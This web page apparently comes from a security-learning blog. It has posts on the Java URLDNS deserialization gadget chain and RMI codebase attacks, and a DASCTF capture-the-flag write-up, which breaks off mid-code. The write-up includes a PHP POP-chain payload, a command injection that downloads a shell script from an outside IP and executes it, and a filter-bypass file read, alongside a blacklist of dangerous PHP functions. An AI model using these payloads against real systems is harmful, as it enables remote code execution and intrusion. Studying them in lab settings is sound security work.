<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Tlife"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Tlife"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Tlife","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Tlife" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-04T12:16:41.000Z" title="2022/4/4 下午8:16:41">2022-04-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-06T14:09:28.951Z" title="2022/4/6 下午10:09:28">2022-04-06</time></span><span class="level-item">6 minutes read (About 839 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/04/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java_URLDNS</a></h1><div class="content"><h2 id="readObject-writeObject"><a href="#readObject-writeObject" class="headerlink" title="readObject/writeObject"></a>readObject/writeObject</h2><p>java在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理</p>
<h2 id="ysoserial-URLDNS"><a href="#ysoserial-URLDNS" class="headerlink" title="ysoserial-URLDNS"></a>ysoserial-URLDNS</h2><p>gadget chains：利用链</p>
<p>URLDNS是ysoserial中一个利用链的名字，其结果是一次<strong>DNS请求</strong></p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>使用java内置的类构造，对第三方库没有依赖</li>
<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>触发反序列化的方法是<code>readObject</code>，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	......</span><br><span class="line">	HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程</p>
<h4 id="如何使用ysoserial项目进行调试"><a href="#如何使用ysoserial项目进行调试" class="headerlink" title="如何使用ysoserial项目进行调试"></a>如何使用ysoserial项目进行调试</h4><p>打开工程，然后针对缺少的依赖，可以直接点击+号进行添加</p>
<p>接下来看一下pom.xml可以发现主类是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.GeneratePayload</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406112357.png" alt="img" style="zoom:67%;">

<p>接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145110.png" alt="image-20220406145109791"></p>
<p>可以发现已经跑起来了，并且在断点这里停下了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145152.png" alt="image-20220406145152006"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406145550.png" alt="image-20220406145550294"></p>
<p>在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Java URL class has an interesting property on its equals and</span><br><span class="line"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="line"> *   during a comparison (either equals or hashCode).</span><br></pre></td></tr></table></figure>

<p>因此我们继续跟进这个函数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406183653.png" alt="image-20220406183653328"></p>
<p>可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406193918.png" alt="image-20220406193918163"></p>
<p>再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194122.png" alt="image-20220406194122333"></p>
<p>而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194654.png" alt="image-20220406194654193"></p>
<p>继续跟进，可以发现调用了getByName</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220406194859.png" alt="image-20220406194859359"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次的Gadget流程如下:<br>1.HashMap-&gt;readObject()<br>2.HashMap-&gt;hash()<br>3.URL-&gt;hashCode()<br>4.URLStreamHandler-&gt;hashCode()<br>5.URLStreamHandler-&gt;getHostAddress()<br>6.InetAddress-&gt;getByName()</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-30T14:53:31.000Z" title="2022/3/30 下午10:53:31">2022-03-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-04T12:15:53.840Z" title="2022/4/4 下午8:15:53">2022-04-04</time></span><span class="level-item">6 minutes read (About 904 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/30/java%E5%AE%A1%E8%AE%A1-rmi%E7%AF%87/">java审计-rmi协议</a></h1><div class="content"><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI是Remote Method Invocation，远程方法调用。是让java虚拟机上的对象调用另一个java虚拟机中对象上的方法。</p>
<h3 id="RMI-Server"><a href="#RMI-Server" class="headerlink" title="RMI Server:"></a>RMI Server:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//继承了java.rmi.Remote接口，其中定义我们要远程调用的函数hello</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实现此接口的类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//主类，用来创建Registry,并将上面的类实例化后绑定到一个网址</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteHelloWorld h=<span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>,<span class="keyword">new</span> RemoteHelloWorld());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将Rexxx对象绑定到Hello这个名字上。</p>
<p>Naming.bind的第一个参数是一个URL，形如:rmi://host:port/name。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p>
<p>如果RMI Registry在本地运行，则host和port可以省略，默认为1099</p>
<h3 id="RMI-client"><a href="#RMI-client" class="headerlink" title="RMI client:"></a>RMI client:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.vulhub.RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello=(RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Heelo&quot;</span>);</span><br><span class="line">        String ret= hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通信分析"><a href="#通信分析" class="headerlink" title="通信分析"></a>通信分析</h3><p>整个通信过程进行了两次TCP握手，建立了两次TCP连接，首先客户端连接Registry,并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息，然后Registry返回一个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象</p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="1-list-lookup远程调用"><a href="#1-list-lookup远程调用" class="headerlink" title="1.list+lookup远程调用"></a>1.list+lookup远程调用</h3><p>list方法可以列出目标上所有绑定的对象:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] s&#x3D; Naming.list(&quot;rmi:&#x2F;&#x2F;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>而lookup作用就是获得某个远程对象，若存在危险方法，则可进行调用</p>
<h3 id="2-RMI利用codebase执行任意代码"><a href="#2-RMI利用codebase执行任意代码" class="headerlink" title="2.RMI利用codebase执行任意代码"></a>2.RMI利用codebase执行任意代码</h3><p>codebase:是一个地址，告诉java虚拟机我们应该从哪个地方去搜索类，通常是远程URL、比如http、ftp等。</p>
<p>如果我们指定codebase=<a target="_blank" rel="noopener" href="http://exampl.com/,%E7%84%B6%E5%90%8E%E5%8A%A0%E8%BD%BDorg.vulhub.example.Example%E7%B1%BB%EF%BC%8C%E5%88%99java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BC%9A%E4%B8%8B%E8%BD%BD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6http://example.com/org/vulhub/example/Example.class">http://exampl.com/,然后加载org.vulhub.example.Example类，则java虚拟机会下载这个文件http://example.com/org/vulhub/example/Example.class</a> ，并作为Example类的字节码。</p>
<p>RMI流程中，反序列化时发现一个对象，先会在CLASSPAATH下寻找，若没找到，则会远程加载codebase中的类。</p>
<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul>
<li>codebase可控</li>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false其中java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置：</li>
<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
<p>PS：当java.rmi.server.useCodebaseOnly为true时，java虚拟机将只信任预先配置好的codebase。</p>
<h3 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a>classAnnotations</h3><p>可以使用SerializationDumper查看数据包中的java反序列化内容</p>
<p>通过修改classAnnotations可以控制codebase。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-30T08:30:04.000Z" title="2022/3/30 下午4:30:04">2022-03-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-30T08:30:04.380Z" title="2022/3/30 下午4:30:04">2022-03-30</time></span><span class="level-item">a few seconds read (About 0 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/30/2022LINE-CTF/">2022LINE-CTF</a></h1><div class="content"></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-27T06:15:16.000Z" title="2022/3/27 下午2:15:16">2022-03-27</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-28T12:22:58.783Z" title="2022/3/28 下午8:22:58">2022-03-28</time></span><span class="level-item">8 minutes read (About 1188 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/27/2022DASCTF-3/">2022DASCTF_3</a></h1><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天都在护网，正好有比赛，打的累的时候就来看看题转换一下心情</p>
<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>简单的pop链，后面记得覆盖一下就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> fin();</span><br><span class="line">$b=<span class="keyword">new</span> what();</span><br><span class="line">$c=<span class="keyword">new</span> mix();</span><br><span class="line">$d=<span class="keyword">new</span> crow();</span><br><span class="line">$e=<span class="keyword">new</span> fin();</span><br><span class="line">$f=<span class="keyword">new</span> mix();</span><br><span class="line">$e-&gt;f1=$f;</span><br><span class="line">$f-&gt;m1=<span class="string">&quot;\n system(&#x27;curl xx&#x27;);&quot;</span>;</span><br><span class="line">$d-&gt;v1=$e;</span><br><span class="line">$c-&gt;m1=$d;</span><br><span class="line">$b-&gt;a=$c;</span><br><span class="line">$a-&gt;f1=$b;</span><br><span class="line">$h=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($h);</span><br></pre></td></tr></table></figure>

<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>python的，很少做打python的题目，所以很多姿势都不是很清楚</p>
<h3 id="1-import导入类并继承加载"><a href="#1-import导入类并继承加载" class="headerlink" title="1.import导入类并继承加载"></a>1.import导入类并继承加载</h3><p>这也是搜索出来比较多的方法，但是他把很多东西都过滤了，所以这种方法不太行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;</span><br></pre></td></tr></table></figure>

<h2 id="2-非预期"><a href="#2-非预期" class="headerlink" title="2.非预期"></a>2.非预期</h2><p>这里先积累一个非预期吧，这个地方的思路也挺巧妙的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = eval(<span class="string">&quot;7*7#`curl http://11xxx:9999`&quot;</span>)</span><br><span class="line">os.system(log)</span><br></pre></td></tr></table></figure>

<p>利用的是两种语言加载一样的特性，eval加载的是python的语言，而system使用的是shell语言特性，所以我们首先让eval执行7*7并先注释掉后面的内容，然后使用system去执行反引号内的系统命令,那么这就意味着，我们此时得到了一个无回显的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#123;0&#125; &#123;1&#125; &quot;7*7#&#96;xxxxx&#96;&quot;&gt; .&#x2F;tmp&#x2F;log.txt</span><br></pre></td></tr></table></figure>

<p>接下来我们可以是curl命令下载一个反弹shell的sh文件到tmp目录下，并执行这个sh文件就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7*7%23&#96;curl%09http:&#x2F;&#x2F;110.42.1&#x2F;aa&gt;&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7*7%23&#96;chmod%09777%09&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>感觉做这题的时候，思维有点被禁锢住了，其实看到一个eval和一个system的时候，就要想到语言的差异性往往也是引起漏洞的开始</p>
<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>可以传phpinfo()，但是过滤了很多关键字，所以还是要先拿到他的源码才行，发现过滤了file关键字，可以采取拼接的方式进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;);</span><br></pre></td></tr></table></figure>

<p>拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $blacklist = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $blackword)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $blackword)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line">$msg = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">$temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">$file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower($ext)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = file_get_contents($temp_file);</span><br><span class="line"><span class="keyword">if</span>(fun($content))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$new_file_name = md5($file_name).<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; 